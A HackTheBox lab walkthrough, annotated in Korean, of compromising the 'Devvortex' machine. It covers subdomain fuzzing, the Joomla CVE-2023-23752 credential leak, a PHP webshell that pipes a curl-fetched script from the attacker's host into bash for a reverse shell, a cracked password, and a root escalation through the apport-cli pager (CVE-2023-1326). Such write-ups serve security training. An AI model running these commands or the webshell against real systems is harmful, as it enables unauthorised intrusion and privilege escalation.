# HackTheBox Walkthrough - Devvortex

**Machine Name**: Devvortex  
**Target IP**: 10.129.229.146  
**Operating System**: Ubuntu Linux  
**Difficulty**: [Not specified]  
**Objective**: Exploit Joomla RCE and CVE-2023-1326 to gain root

---

## 🧭 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA nmap/Devvortex 10.129.229.146
```

**Open Ports:**
- 22/tcp - OpenSSH 8.2p1 (Ubuntu)
- 80/tcp - nginx 1.18.0 (Ubuntu)

```bash
/etc/hosts 추가:
10.129.229.146  devvortex.htb
```

---

## 🌐 Web Enumeration

- 기본 페이지에서 정보 없음 → **Subdomain Enumeration** 시도:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -t 100
```

- 발견: `dev.devvortex.htb`

```bash
/etc/hosts 추가:
10.129.229.146  dev.devvortex.htb
```

### Joomla CMS 발견

- 버전 확인: **4.2.6**
- 취약점: **CVE-2023-23752**

```bash
ruby exploit.rb http://dev.devvortex.htb
# 결과에서 DB 사용자: lewis / 패스워드: P4ntherg0t1n5r3c0n##
```

관리자 로그인 성공: `lewis / P4ntherg0t1n5r3c0n##`

### Webshell 업로드 및 Reverse Shell

```php
<?php system("curl 10.10.14.72:80/rev.sh|bash"); ?>
```

Reverse shell 연결 및 stable shell 전환 후 DB에서 평문 자격증명 획득

---

## 🧪 MySQL 내부 확인

```sql
select * from sd4fg_users;
```
- 사용자: `logan`
- bcrypt 해시 크랙: `tequieromucho`

```bash
ssh logan@10.129.229.146
Password: tequieromucho
```

### 🧑‍💻 User Flag

```bash
cat /home/logan/user.txt
# => 73fb4da8154226194662a390d14722eb
```

---

## 👑 Privilege Escalation

```bash
sudo -l
# (ALL : ALL) /usr/bin/apport-cli
```

- **CVE-2023-1326** exploitable:

```bash
echo "ProblemType: Crash" >> /tmp/test.crash
sudo /usr/bin/apport-cli -c /tmp/test.crash
# View report → press V → !/bin/bash
```

### 🏁 Root Flag

```bash
cat /root/root.txt
# => 30ab4a0362b3f1a679ad98976266883d
```

---